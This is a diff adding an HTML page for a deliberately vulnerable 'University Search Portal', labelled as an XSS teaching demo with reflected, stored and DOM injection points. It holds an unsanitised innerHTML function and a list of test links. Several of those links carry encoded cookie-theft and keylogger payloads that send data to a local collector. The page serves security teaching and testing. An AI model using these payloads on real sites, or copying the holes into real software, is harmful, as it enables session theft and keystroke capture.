@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>University Search Portal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #333;
+        }
+        .form-section {
+            margin: 30px 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background: #fafafa;
+        }
+        input, textarea, select {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0 15px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .results {
+            margin-top: 20px;
+            padding: 15px;
+            background: #e9ecef;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid #ffeaa7;
+            margin-bottom: 20px;
+        }
+        .cookie-info {
+            background: #d1ecf1;
+            color: #0c5460;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>University Search Portal</h1>
+            <p>Find courses, professors, and academic resources</p>
+        </div>
+
+        <div class="warning">
+            <strong>Educational Demo:</strong> This is a deliberately vulnerable site for XSS demonstration. 
+            User input is NOT sanitized - perfect for testing XSS payloads safely.
+        </div>
+
+        <div class="cookie-info">
+            <strong>Session Info:</strong> You are logged in as Student ID: 12345 | Session: abc123def456
+            <script>document.write(' | Current cookies: ' + document.cookie)</script>
+        </div>
+
+        <!-- Search Form - Reflected XSS -->
+        <div class="form-section">
+            <h3>Course Search (Reflected XSS)</h3>
+            <form action="search.php" method="GET">
+                <label>Search for courses:</label>
+                <input type="text" name="query" placeholder="Enter course name, professor, or keyword">
+                <button type="submit">Search</button>
+            </form>
+        </div>
+
+        <!-- Comment Form - Stored XSS -->
+        <div class="form-section">
+            <h3>Course Review (Stored XSS)</h3>
+            <form action="comment.php" method="POST">
+                <label>Course Code:</label>
+                <select name="course">
+                    <option value="CS101">CS101 - Introduction to Programming</option>
+                    <option value="MATH200">MATH200 - Calculus II</option>
+                    <option value="PHYS150">PHYS150 - General Physics</option>
+                </select>
+                
+                <label>Your Name:</label>
+                <input type="text" name="name" placeholder="Enter your name">
+                
+                <label>Review/Comment:</label>
+                <textarea name="comment" rows="4" placeholder="Share your thoughts about this course..."></textarea>
+                
+                <button type="submit">Submit Review</button>
+            </form>
+        </div>
+
+        <!-- Profile Update Form - Multiple injection points -->
+        <div class="form-section">
+            <h3>Update Profile (Multiple XSS Points)</h3>
+            <form action="profile.php" method="POST">
+                <label>Display Name:</label>
+                <input type="text" name="display_name" placeholder="How should we display your name?">
+                
+                <label>Bio/About Me:</label>
+                <textarea name="bio" rows="3" placeholder="Tell us about yourself..."></textarea>
+                
+                <label>Favorite Quote:</label>
+                <input type="text" name="quote" placeholder="Your inspirational quote">
+                
+                <label>Homepage URL:</label>
+                <input type="url" name="homepage" placeholder="https://your-website.com">
+                
+                <button type="submit">Update Profile</button>
+            </form>
+        </div>
+
+        <!-- Contact Form -->
+        <div class="form-section">
+            <h3>Contact Support (DOM XSS)</h3>
+            <form onsubmit="return false;">
+                <label>Your Email:</label>
+                <input type="email" id="contact-email" placeholder="your.email@university.edu">
+                
+                <label>Subject:</label>
+                <input type="text" id="contact-subject" placeholder="What can we help you with?">
+                
+                <label>Message:</label>
+                <textarea id="contact-message" rows="4" placeholder="Describe your issue..."></textarea>
+                
+                <button type="button" onclick="showContactPreview()">Preview Message</button>
+            </form>
+            
+            <div id="contact-preview" class="results" style="display: none;">
+                <h4>Message Preview:</h4>
+                <div id="preview-content"></div>
+            </div>
+        </div>
+
+        <!-- Test URLs for easy XSS testing -->
+        <div class="form-section">
+            <h3>Quick XSS Test Links</h3>
+            <p>Click these links to test different XSS payloads:</p>
+            <ul>
+                <li><a href="search.php?query=<script>alert('Basic XSS')</script>">Basic Alert XSS</a></li>
+                <li><a href="search.php?query=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27https%3A//localhost%3A8002/steal%3Fcookies%3D%27%2Bdocument.cookie%29%22%3E">Cookie Theft XSS</a></li>
+                <li><a href="search.php?query=<script>document.body.style.background='red'</script>">DOM Manipulation</a></li>
+                <li><a href="search.php?query=%3Cscript%3Edocument.onkeypress%3Dfunction%28e%29%7Bfetch%28%27https%3A//localhost%3A8002/keylog%3Fkey%3D%27%2BString.fromCharCode%28e.which%29%29%7D%3C/script%3E">Keylogger XSS</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Vulnerable DOM XSS function
+        function showContactPreview() {
+            const email = document.getElementById('contact-email').value;
+            const subject = document.getElementById('contact-subject').value;
+            const message = document.getElementById('contact-message').value;
+            
+            // VULNERABLE: Direct innerHTML assignment without sanitization
+            document.getElementById('preview-content').innerHTML = `
+                <strong>From:</strong> ${email}<br>
+                <strong>Subject:</strong> ${subject}<br>
+                <strong>Message:</strong> ${message}
+            `;
+            
+            document.getElementById('contact-preview').style.display = 'block';
+        }
+
+        // Set some cookies for demonstration
+        document.cookie = "sessionId=abc123def456; path=/";
+        document.cookie = "userId=12345; path=/";
+        document.cookie = "role=student; path=/";
+    </script>
+</body>
+</html>
